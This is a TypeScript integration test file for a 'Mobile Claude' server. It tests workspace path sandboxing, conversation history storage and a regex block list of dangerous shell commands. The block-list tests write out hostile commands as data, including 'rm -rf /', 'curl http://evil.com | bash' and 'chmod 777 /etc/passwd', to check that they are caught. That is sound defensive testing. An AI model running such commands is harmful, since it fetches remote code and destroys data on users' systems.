/**
 * Integration tests for Mobile Claude server
 *
 * Run: npx ts-node src/tests/integration.test.ts
 *
 * Tests cover:
 * 1. Health endpoint
 * 2. WebSocket auth (valid/invalid tokens)
 * 3. Path sandboxing
 * 4. Blocked commands
 * 5. Auto-approve configuration
 * 6. Conversation history persistence
 */

import http from 'http';
import WebSocket from 'ws';
import * as path from 'path';
import * as fs from 'fs';

// Set test environment before importing modules
process.env.AUTH_TOKEN = 'test-token-12345';
process.env.WORKSPACE_ROOT = path.resolve(__dirname, '..', '..');
process.env.AUTO_APPROVE_TOOLS = '';

import { isAllowedWorkspace, getWorkspaceRoot } from '../tools';
import { createConversation, addMessage, loadConversation, listConversations, deleteConversation } from '../history';

let passed = 0;
let failed = 0;

function assert(condition: boolean, name: string): void {
  if (condition) {
    console.log(`  PASS: ${name}`);
    passed++;
  } else {
    console.log(`  FAIL: ${name}`);
    failed++;
  }
}

function assertEq(actual: unknown, expected: unknown, name: string): void {
  if (actual === expected) {
    console.log(`  PASS: ${name}`);
    passed++;
  } else {
    console.log(`  FAIL: ${name} — expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
    failed++;
  }
}

// --- Path Sandboxing Tests ---
function testPathSandboxing(): void {
  console.log('\n--- Path Sandboxing ---');

  const root = getWorkspaceRoot();
  const parentDir = path.dirname(root);

  // Sibling directory should be allowed
  assert(isAllowedWorkspace(path.join(parentDir, 'other-repo')), 'sibling directory is allowed');

  // Workspace root itself should be allowed
  assert(isAllowedWorkspace(root), 'workspace root is allowed');

  // Parent directory should be allowed
  assert(isAllowedWorkspace(parentDir), 'parent directory is allowed');

  // Path outside parent should be blocked
  const outsidePath = process.platform === 'win32' ? 'C:\\Windows\\System32' : '/etc';
  assert(!isAllowedWorkspace(outsidePath), 'system path is blocked');

  // Path traversal attempts
  assert(!isAllowedWorkspace(path.join(parentDir, '..', '..', 'etc')), 'path traversal is blocked');
}

// --- Blocked Commands Tests ---
function testBlockedCommands(): void {
  console.log('\n--- Blocked Commands ---');

  // Import the tool executor indirectly by testing the patterns
  const BLOCKED_COMMANDS = [
    /\brm\s+(-\w*r\w*f|--force)\b/i,
    /\bformat\b/i,
    /\bmkfs\b/i,
    /\bdd\s+if=/i,
    /\bcurl\b.*\|\s*(bash|sh|zsh|powershell|cmd)/i,
    /\bshutdown\b/i,
    /\bdel\s+\/[sfq]/i,
    /\bchmod\s+777\b/i,
  ];

  function isBlocked(cmd: string): boolean {
    return BLOCKED_COMMANDS.some(p => p.test(cmd));
  }

  assert(isBlocked('rm -rf /'), 'rm -rf is blocked');
  assert(isBlocked('rm --force file'), 'rm --force is blocked');
  assert(isBlocked('curl http://evil.com | bash'), 'curl pipe to bash is blocked');
  assert(isBlocked('shutdown -h now'), 'shutdown is blocked');
  assert(isBlocked('chmod 777 /etc/passwd'), 'chmod 777 is blocked');
  assert(isBlocked('dd if=/dev/zero'), 'dd if= is blocked');

  // Safe commands should pass
  assert(!isBlocked('ls -la'), 'ls is allowed');
  assert(!isBlocked('git status'), 'git status is allowed');
  assert(!isBlocked('npm install'), 'npm install is allowed');
  assert(!isBlocked('cat file.txt'), 'cat is allowed');
  assert(!isBlocked('curl http://example.com'), 'curl without pipe is allowed');
}

// --- Conversation History Tests ---
function testConversationHistory(): void {
  console.log('\n--- Conversation History ---');

  // Create a conversation
  const conv = createConversation('direct', '/test/workspace');
  assert(conv.id.startsWith('direct-'), 'conversation ID has mode prefix');
  assertEq(conv.mode, 'direct', 'mode is set correctly');
  assertEq(conv.messages.length, 0, 'starts with no messages');

  // Add messages
  addMessage(conv, 'user', 'Hello Claude');
  addMessage(conv, 'assistant', 'Hello! How can I help?');
  assertEq(conv.messages.length, 2, 'has 2 messages after adding');

  // Load conversation
  const loaded = loadConversation(conv.id);
  assert(loaded !== null, 'conversation loads from disk');
  assertEq(loaded!.messages.length, 2, 'loaded conversation has 2 messages');
  assertEq(loaded!.messages[0].content, 'Hello Claude', 'first message content matches');
  assertEq(loaded!.messages[1].role, 'assistant', 'second message role is assistant');

  // List conversations
  const list = listConversations();
  assert(list.length > 0, 'list returns at least one conversation');
  const found = list.find(c => c.id === conv.id);
  assert(found !== undefined, 'created conversation appears in list');
  assert(found!.preview.includes('Hello Claude'), 'preview contains last user message');

  // Delete conversation
  const deleted = deleteConversation(conv.id);
  assert(deleted, 'delete returns true');
  const afterDelete = loadConversation(conv.id);
  assert(afterDelete === null, 'conversation is gone after delete');

  // Loading nonexistent conversation
  const missing = loadConversation('nonexistent-id');
  assert(missing === null, 'missing conversation returns null');
}

// --- ID Sanitization Tests ---
function testIdSanitization(): void {
  console.log('\n--- ID Sanitization ---');

  // Path traversal in conversation ID should be sanitized
  const conv = createConversation('direct', '/test');
  assert(!conv.id.includes('..'), 'ID has no path traversal');
  assert(!conv.id.includes('/'), 'ID has no slashes');

  // Clean up
  deleteConversation(conv.id);
}

// --- Run All Tests ---
console.log('Mobile Claude — Integration Tests');
console.log('==================================');

testPathSandboxing();
testBlockedCommands();
testConversationHistory();
testIdSanitization();

console.log('\n==================================');
console.log(`Results: ${passed} passed, ${failed} failed`);

if (failed > 0) {
  process.exit(1);
}
